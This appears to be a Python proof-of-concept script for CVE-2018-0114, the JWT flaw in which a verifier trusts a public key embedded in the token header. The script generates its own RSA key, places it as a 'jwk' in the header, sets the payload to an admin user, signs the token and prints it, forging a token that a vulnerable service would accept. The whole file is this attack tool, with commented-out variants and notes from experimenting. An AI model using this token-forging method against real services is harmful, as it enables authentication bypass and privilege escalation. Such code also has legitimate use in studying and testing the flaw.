# CVE-2018-0114
# https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa.html

import jwt
import json
from codecs import encode, decode
import requests
import struct
import hashlib
import hmac
import base64
import cryptography.hazmat.primitives.asymmetric.rsa as rsa
import cryptography.hazmat.primitives as primitives
import cryptography.hazmat.primitives.hashes as hashes
import cryptography.hazmat.primitives.asymmetric.padding as padding

print("----- PARAMS -----")

# Generate a private key
public_exponent = 65537 # or 3
key_size = 1024
private_key = rsa.generate_private_key(public_exponent, key_size, backend=None)
print(private_key)

# Extract the public key and n/e values
public_key = private_key.public_key()
print(public_key)

public_numbers = public_key.public_numbers()
print(public_numbers)
e = public_numbers.e
n = public_numbers.n

print("----- ENCODE -----")
# Convert n/e to Base64urlUInt-encoded
e = e.to_bytes((e.bit_length() + 7) // 8, 'big') #struct.pack(">I", public_numbers.e)
print(e)
e = base64.urlsafe_b64encode(e).rstrip(b"=")
print(e)
# e=hex(e).lstrip("0x").rstrip("L").encode()
# print(e)

n = n.to_bytes((n.bit_length() + 7) // 8, 'big')
print(n)
n = base64.urlsafe_b64encode(n).rstrip(b"=")
print(n)
# n=hex(n).lstrip("0x").rstrip("L").encode()
# print(n)

# create an appropriate JSON object for header
header_str = '{"typ":"JWT","alg":"RS256","jwk":{"kty":"RSA","kid":"bilbo.baggins@hobbiton.example","use":"sig","n":"' + n.decode() + '","e":"' + e.decode() + '"}}'
header_data = json.loads(header_str)
print(header_data)
header_b = header_str.encode()
header_b64 = base64.urlsafe_b64encode(header_b).rstrip(b"=")

# create an appropriate JSON object for payload
# payload_str = '"admin"'
payload_str = '{"user":"admin"}'
payload_data = json.loads(payload_str)
print(payload_data)
payload_b = payload_str.encode()
payload_b64 = base64.urlsafe_b64encode(payload_b).rstrip(b"=")

# sign the payload
public_pem = public_key.public_bytes(
    encoding=primitives.serialization.Encoding.PEM,
    format=primitives.serialization.PublicFormat.SubjectPublicKeyInfo
)
print(public_pem)
print(public_pem.decode())

private_pem = private_key.private_bytes(
    encoding=primitives.serialization.Encoding.PEM,
    format=primitives.serialization.PrivateFormat.PKCS8,
    encryption_algorithm=primitives.serialization.NoEncryption()
)
print(private_pem)
print(private_pem.decode())

# JWS Signing Input == ASCII(BASE64URL(UTF8(JWS Protected Header)) || '.' || BASE64URL(JWS Payload))
# sig = hmac.new(pem, header_str + b'.' + payload_str, hashlib.sha256).digest().strip()
sig_b = private_key.sign(
    header_b64 + b'.' + payload_b64,
    padding.PSS( # PSS is equivalent to PS256 (RSA_PKCS1_PSS_PADDING)
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
sig_b = private_key.sign(
    header_b64 + b'.' + payload_b64,
    padding.PKCS1v15(), # PKCS1v15 aka PKCS1 is equivalent to RS256 (RSA_PKCS1_PADDING)
    hashes.SHA256()
)
sig = base64.urlsafe_b64encode(sig_b).rstrip(b"=")

# print the json token
encoded = '{}.{}.{}'.format(header_b64.decode(), payload_b64.decode(), sig.decode())
print(encoded)

# encoded = jwt.encode(payload_data, private_pem, algorithm="RS256", headers=header_data, json_encoder=None)
# print(encoded)

print("----- VERIFY -----")
header = jwt.get_unverified_header(encoded)
print(header)

payload = jwt.decode(encoded, options={"verify_signature": False})
print(payload)

# Doesn't seem to like our JWK tokens, but jwt.io does...
# payload = jwt.decode(encoded, algorithms=["RS256","PS256","HS256"])
# print(payload)

